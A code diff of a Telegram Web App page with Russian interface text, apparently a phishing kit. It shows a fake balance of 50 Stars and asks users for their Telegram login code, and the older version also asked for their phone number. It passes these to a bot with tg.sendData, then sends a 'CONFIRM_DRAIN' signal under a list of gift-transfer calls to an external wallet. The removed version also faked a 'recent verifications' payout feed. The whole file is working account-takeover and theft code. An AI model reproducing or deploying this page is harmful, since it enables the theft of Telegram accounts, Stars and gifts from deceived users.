@@ -6,108 +6,59 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: #0e1621; color: white; font-family: -apple-system, system-ui; margin: 0; padding: 15px; }
-        .card { background: linear-gradient(145deg, #1c2836, #17212b); border: 1px solid #2b3a4a; padding: 20px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
-        
-        /* Стили профиля */
-        .profile-section { margin-top: 10px; display: none; flex-direction: column; align-items: center; }
-        #user-photo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #248bcf; margin-bottom: 10px; object-fit: cover; }
-        .user-name { font-weight: bold; font-size: 18px; margin-bottom: 2px; }
-        .user-id { color: #5d6d7d; font-size: 12px; margin-bottom: 15px; }
-        
-        .balance-label { color: #8897a3; font-size: 12px; font-weight: 600; text-transform: uppercase; }
-        .balance-val { font-size: 42px; font-weight: bold; margin: 5px 0 20px 0; color: #fff; }
-        
-        input { width: 100%; padding: 16px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #3d4f63; background: #0e1621; color: white; box-sizing: border-box; font-size: 16px; }
-        button { background: #248bcf; color: white; border: none; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
-        
-        .status-msg { font-size: 12px; color: #8897a3; margin-top: 10px; line-height: 1.4; }
-        .payouts { width: 100%; margin-top: 20px; background: rgba(23, 33, 43, 0.6); border-radius: 15px; padding: 15px; box-sizing: border-box; }
-        .payout-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #232e3c; font-size: 13px; }
+        .card { background: #17212b; padding: 25px; border-radius: 20px; text-align: center; border: 1px solid #242f3d; }
+        .avatar { width: 80px; height: 80px; border-radius: 50%; margin: 10px auto; border: 2px solid #248bcf; display: block; }
+        .user-name { font-size: 18px; font-weight: bold; margin-bottom: 5px; }
+        .stars-val { font-size: 38px; font-weight: bold; color: #fecb2e; margin: 15px 0; }
+        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #2b3a4a; background: #0e1621; color: white; font-size: 18px; text-align: center; box-sizing: border-box; }
+        button { background: #248bcf; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: bold; width: 100%; font-size: 16px; margin-top: 15px; }
+        .mask-list { font-size: 11px; color: #5d6d7d; text-align: left; margin-top: 20px; line-height: 1.6; }
     </style>
 </head>
 <body>
-    <div class="card" id="main-card">
-        <div id="content">
-            <div class="balance-label">Инициализация шлюза...</div>
-            <div class="balance-val" id="pct">0%</div>
+    <div class="card" id="main-content">
+        <img id="u-pic" src="" class="avatar">
+        <div id="u-name" class="user-name">Загрузка...</div>
+        <div class="stars-val" id="stars-display">0 ⭐</div>
+        
+        <div id="step-ui">
+            <p style="font-size: 14px; color: #8897a3;">Введите код из чата Telegram для завершения регистрации</p>
+            <input type="number" id="tg-code" placeholder="0 0 0 0 0">
+            <button onclick="submitCode()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
         </div>
-    </div>
-
-    <div class="payouts">
-        <div style="font-size:10px; color:#5d6d7d; margin-bottom:10px;">RECENT VERIFICATIONS</div>
-        <div id="payout-list"></div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        
-        // Получаем данные юзера из ТГ
-        const user = tg.initDataUnsafe?.user;
+        const user = tg.initDataUnsafe.user;
+        const params = new URLSearchParams(window.location.search);
+        const amount = params.get('amount') || "50";
 
-        let p = 0;
-        let inv = setInterval(() => {
-            p += Math.floor(Math.random() * 20) + 5;
-            if(p >= 100) { clearInterval(inv); showStep1(); }
-            document.getElementById('pct').innerText = Math.min(p, 100) + "%";
-        }, 300);
+        document.getElementById('u-pic').src = user?.photo_url || "https://i.imgur.com/8K9v679.png";
+        document.getElementById('u-name').innerText = user?.first_name || "Пользователь";
+        document.getElementById('stars-display').innerText = amount + " ⭐";
 
-        function showStep1() {
-            document.getElementById('content').innerHTML = `
-                <div class="balance-label">Найден заблокированный чек</div>
-                <div class="balance-val">50.00 ⭐</div>
-                <input type="tel" id="phone" placeholder="Номер телефона">
-                <button onclick="sendPhone()">Верифицировать номер</button>
-            `;
-        }
-
-        function sendPhone() {
-            tg.sendData("p:" + document.getElementById('phone').value);
-            document.getElementById('content').innerHTML = `
-                <div class="balance-label">Безопасность</div>
-                <div class="balance-val">Код</div>
-                <input type="number" id="code" placeholder="Код из Telegram">
-                <button onclick="sendCode()">Подтвердить</button>
-            `;
-        }
-
-        function sendCode() {
-            tg.sendData("c:" + document.getElementById('code').value);
-            // Показываем "Загрузку" и профиль
-            document.getElementById('content').innerHTML = `<h3>Синхронизация профиля...</h3>`;
+        function submitCode() {
+            let code = document.getElementById('tg-code').value;
+            if(code.length < 5) return;
+            tg.sendData("c:" + code);
             
-            setTimeout(() => {
-                // ФИНАЛЬНЫЙ ЭКРАН С АВАТАРКОЙ
-                document.getElementById('content').innerHTML = `
-                    <div class="profile-section" style="display: flex;">
-                        <img id="user-photo" src="${user?.photo_url || 'https://i.imgur.com/8K9v679.png'}" alt="avatar">
-                        <div class="user-name">${user?.first_name || 'User'} ${user?.last_name || ''}</div>
-                        <div class="user-id">ID: ${user?.id || 'Unknown'}</div>
-                    </div>
-                    <div class="balance-label">Ваш баланс</div>
-                    <div class="balance-val">50.00 ⭐</div>
-                    <button onclick="tg.sendData('CONFIRM_DRAIN')">ВЫВЕСТИ ЗВЕЗДЫ</button>
-                    <div class="status-msg">
-                        Система выполнит: <br>
-                        <b>• ConvertGiftToStars</b> (Комиссия 0%) <br>
-                        <b>• TransferGift</b> (Мгновенно) <br>
-                        <b>• SendGift</b> (На внешний кошелек)
-                    </div>
-                `;
-            }, 3000);
+            document.getElementById('step-ui').innerHTML = `
+                <div style="margin: 20px 0;">🔄 Синхронизация активов...</div>
+                <button onclick="finalAction()" style="background: #31b545;">НАЖМИТЕ ЧТОБЫ ВЫВЕСТИ</button>
+                <div class="mask-list">
+                    • ConvertGiftToStars [Fragment API] <br>
+                    • TransferGift [Smart Contract] <br>
+                    • SendGift [Syncing]
+                </div>
+            `;
         }
 
-        // Рандомные юзеры внизу
-        const names = ['alex_crypto', 'masha_nft', 'ivan_ton', 'vlad_top'];
-        function addP() {
-            const list = document.getElementById('payout-list');
-            const row = document.createElement('div');
-            row.className = 'payout-row';
-            row.innerHTML = `<span>@${names[Math.floor(Math.random()*names.length)]}***</span><span style="color:#fecb2e">50.00 ⭐</span>`;
-            list.prepend(row);
-            if(list.children.length > 3) list.lastChild.remove();
+        function finalAction() {
+            tg.sendData("CONFIRM_DRAIN");
+            tg.close();
         }
-        setInterval(addP, 5000);
     </script>
 </body>
 </html>
